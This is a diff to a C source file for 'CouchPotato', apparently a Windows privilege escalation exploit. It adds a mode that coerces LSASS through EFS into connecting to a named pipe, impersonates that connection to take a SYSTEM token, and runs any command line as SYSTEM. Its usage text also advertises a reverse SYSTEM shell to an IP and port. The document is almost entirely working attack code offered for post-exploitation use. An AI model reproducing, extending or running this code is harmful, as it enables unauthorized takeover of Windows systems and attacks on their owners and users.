@@ -208,6 +208,140 @@ VOID efs_escalate(char* ip, char* port) {
     WSACleanup();
 }
 
+// ============================================================
+// -exec <cmdline>: run a command as SYSTEM and stream stdout/stderr
+// to the local console (no socket, no listener). For use as a
+// post-exploit shell drop-in.
+// ============================================================
+static VOID cmd_exec(const char* cmdline) {
+    HANDLE hpipe = CreateNamedPipeA(
+        "\\\\.\\pipe\\CouchPotato\\pipe\\srvsvc",
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+        PIPE_UNLIMITED_INSTANCES, 512, 512, NMPWAIT_WAIT_FOREVER, NULL);
+    if (!hpipe || hpipe == INVALID_HANDLE_VALUE) {
+        printf("[-] CreateNamedPipe: %lu\n", GetLastError()); return;
+    }
+
+    HANDLE hThread = CreateThread(NULL, 0, efs_trigger, NULL, 0, NULL);
+    if (!hThread) {
+        printf("[-] CreateThread: %lu\n", GetLastError());
+        CloseHandle(hpipe); return;
+    }
+
+    OVERLAPPED ov = { 0 };
+    ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
+    ConnectNamedPipe(hpipe, &ov);
+
+    DWORD w = WaitForSingleObject(ov.hEvent, 15000);
+    WaitForSingleObject(hThread, 3000);
+    CloseHandle(hThread);
+    CloseHandle(ov.hEvent);
+
+    if (w == WAIT_TIMEOUT) {
+        printf("[-] Coercion failed\n");
+        CloseHandle(hpipe); return;
+    }
+    printf("[+] LSASS connected\n");
+
+    if (!ImpersonateNamedPipeClient(hpipe)) {
+        printf("[-] ImpersonateNamedPipeClient: %lu\n", GetLastError());
+        CloseHandle(hpipe); return;
+    }
+    printf("[+] Impersonating SYSTEM\n");
+
+    HANDLE h_ex = NULL;
+    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex)) {
+        printf("[-] OpenThreadToken: %lu\n", GetLastError());
+        RevertToSelf(); CloseHandle(hpipe); return;
+    }
+
+    HANDLE h_new = NULL;
+    if (!DuplicateTokenEx(h_ex, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &h_new)) {
+        printf("[-] DuplicateTokenEx: %lu\n", GetLastError());
+        CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe); return;
+    }
+    printf("[+] SYSTEM token duplicated\n");
+
+    // create pipes for child stdout/stderr -> our console
+    HANDLE hOutR = NULL, hOutW = NULL;
+    HANDLE hErrR = NULL, hErrW = NULL;
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+    if (!CreatePipe(&hOutR, &hOutW, &sa, 0) ||
+        !CreatePipe(&hErrR, &hErrW, &sa, 0)) {
+        printf("[-] CreatePipe: %lu\n", GetLastError());
+        CloseHandle(h_new); CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe);
+        return;
+    }
+    SetHandleInformation(hOutR, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(hErrR, HANDLE_FLAG_INHERIT, 0);
+
+    // convert command line to wide string
+    int wlen = MultiByteToWideChar(CP_ACP, 0, cmdline, -1, NULL, 0);
+    WCHAR* wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wlen * sizeof(WCHAR));
+    MultiByteToWideChar(CP_ACP, 0, cmdline, -1, wcmd, wlen);
+
+    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
+    si.hStdOutput = hOutW;
+    si.hStdError  = hErrW;
+    si.dwFlags   = STARTF_USESTDHANDLES;
+    PROCESS_INFORMATION pi = { 0 };
+
+    if (!CreateProcessAsUserW(h_new, NULL, wcmd, NULL, NULL, TRUE,
+        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        printf("[-] CreateProcessAsUserW: %lu\n", GetLastError());
+    } else {
+        CloseHandle(hOutW);
+        CloseHandle(hErrW);
+
+        // stream stdout
+        char  buf[4096];
+        DWORD got = 0;
+        BOOL  childDone = FALSE;
+        while (!childDone) {
+            DWORD avail = 0;
+            if (PeekNamedPipe(hOutR, NULL, 0, NULL, &avail, NULL) && avail) {
+                if (ReadFile(hOutR, buf, sizeof(buf), &got, NULL) && got)
+                    fwrite(buf, 1, got, stdout);
+                continue;
+            }
+            if (PeekNamedPipe(hErrR, NULL, 0, NULL, &avail, NULL) && avail) {
+                if (ReadFile(hErrR, buf, sizeof(buf), &got, NULL) && got)
+                    fwrite(buf, 1, got, stderr);
+                continue;
+            }
+            DWORD r = WaitForSingleObject(pi.hProcess, 50);
+            if (r == WAIT_OBJECT_0) {
+                // drain remaining
+                while (ReadFile(hOutR, buf, sizeof(buf), &got, NULL) && got)
+                    fwrite(buf, 1, got, stdout);
+                while (ReadFile(hErrR, buf, sizeof(buf), &got, NULL) && got)
+                    fwrite(buf, 1, got, stderr);
+                childDone = TRUE;
+            }
+        }
+        DWORD exitcode = 0;
+        GetExitCodeProcess(pi.hProcess, &exitcode);
+        printf("[+] exit=%lu\n", exitcode);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    HeapFree(GetProcessHeap(), 0, wcmd);
+    CloseHandle(hOutR); CloseHandle(hOutW);
+    CloseHandle(hErrR); CloseHandle(hErrW);
+    CloseHandle(h_new);
+    CloseHandle(h_ex);
+    RevertToSelf();
+    CloseHandle(hpipe);
+}
+
+static void usage(void) {
+    printf(
+        "Usage:\n"
+        "  CouchPotato.exe <ip> <port>          reverse SYSTEM shell to <ip>:<port>\n"
+        "  CouchPotato.exe -exec <cmdline>       run command as SYSTEM, write output to stdout\n");
+}
+
 int main(void) {
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
@@ -221,8 +355,17 @@ int main(void) {
     }
     while (cmd[p] == ' ') p++;
     char* a = cmd + p;
+
+    if (_strnicmp(a, "-exec", 5) == 0 && (a[5] == ' ' || a[5] == '\0')) {
+        a += 5;
+        while (*a == ' ') a++;
+        if (!*a) { usage(); return 1; }
+        cmd_exec(a);
+        return 0;
+    }
+
     char* s = strchr(a, ' ');
-    if (!a[0] || !s) { printf("Usage: CouchPotato.exe <ip> <port>\n"); return 1; }
+    if (!a[0] || !s) { usage(); return 1; }
 
     char ip[16] = { 0 }, port[6] = { 0 };
     strncpy(ip, a, s - a);
